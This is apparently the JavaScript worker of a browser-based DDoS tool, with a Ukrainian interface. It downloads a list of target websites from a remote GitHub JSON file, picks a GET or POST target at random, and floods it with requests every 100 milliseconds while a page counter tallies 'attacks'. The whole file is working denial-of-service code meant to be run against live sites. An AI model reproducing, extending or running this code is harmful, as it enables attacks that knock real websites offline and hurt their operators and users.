// Worker
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'

const fetchMode = {
	mode: 'no-cors',
	referrerPolicy: 'no-referrer'
}

add_count = () => document.getElementById("attacks").textContent++

/*
function catchErr(e) {
	alert(`Помилка!\nПеревірте підключення до інтернету\nТекст помилки: ${e}`);
	console.error("No internet connection");
	Doser.stop();
}
*/

randint = (to) => Math.floor(Math.random() * to)

async function getTarget() {
    targets = await fetch(targetSource);
    data = await targets.json();

    targets = [];
    for (var i = 0; i < data.length; i++) {
        if (data[i].method == 'post' || data[i].method == 'get') {
            targets.push(data[i])
        }
    };

    return targets[randint(targets.length)]
}


class doser {
    attack = false; // Status of attack
    interval;

    async start() {
    	this.attack = true;

        // Startup interval of DDoS attack

        btn.textContent = "Стоп";
        let target = await getTarget()
        console.log(target)

        let targ = document.getElementById("target");
        let method = document.getElementById("method");
        targ.textContent = target.page;
        method.textContent = target.method.toUpperCase();

        this.interval = setInterval(async function () {
            // Requests

            try {
	            await fetch([target.page], {
	            	method: target.method,
	            	...fetchMode
	            }).then(() => {
	                // After requests

	                console.log("Ok!");
	                add_count();
	            })
        	} catch (e) {this.stop()}
        }, 100);
    };
    stop() {
    	this.attack = false;
    	clearInterval(this.interval);
    	btn.textContent = "Старт!";
    }; // Kill interval
}



let btn = document.getElementById("button")
const Doser = new doser

btn.addEventListener('click', (e) => {
    e.preventDefault();

    !Doser.attack ? Doser.start() : Doser.stop();
})

// Слава Україні!